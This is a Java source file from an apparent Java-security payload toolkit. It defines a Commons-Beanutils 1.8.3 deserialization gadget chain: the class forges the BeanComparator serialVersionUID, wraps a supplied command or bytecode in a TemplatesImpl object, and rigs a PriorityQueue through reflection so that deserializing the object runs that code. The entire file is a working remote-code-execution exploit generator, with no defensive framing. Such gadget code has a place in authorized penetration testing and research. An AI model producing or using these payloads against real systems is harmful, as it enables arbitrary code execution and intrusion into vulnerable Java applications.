package com.xyuxu.javasec.core.payload.gadgets;

import com.xyuxu.javasec.core.generator.TemplatesBytecodeGenerator;
import com.xyuxu.javasec.utils.Reflections;
import com.xyuxu.javasec.utils.Serializer;
import org.apache.commons.beanutils.BeanComparator;

import java.math.BigInteger;
import java.util.PriorityQueue;

public class CommonsBeanutils_183 implements ObjectPayload,BytecodePayload {

    @Override
    public Object getObject(final String command) throws Exception {

        Serializer.hackSerialVersionUID(BeanComparator.class,-3490850999041592962L);

        final Object templates = TemplatesBytecodeGenerator.createTemplatesImpl(command);

        final BeanComparator comparator = new BeanComparator("lowestSetBit");

        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);

        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));

        Reflections.setFieldValue(comparator, "property", "outputProperties");

        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = templates;

        return queue;

    }

    public Object getObjectWithBytecode(byte[] classBytes) throws Exception {

        Serializer.hackSerialVersionUID(BeanComparator.class, -3490850999041592962L);
        final Object templates = TemplatesBytecodeGenerator.createTemplatesImplWithBytecode(classBytes);
        final BeanComparator comparator = new BeanComparator("lowestSetBit");
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);

        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));

        Reflections.setFieldValue(comparator, "property", "outputProperties");

        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = templates;

        return queue;
    }

}
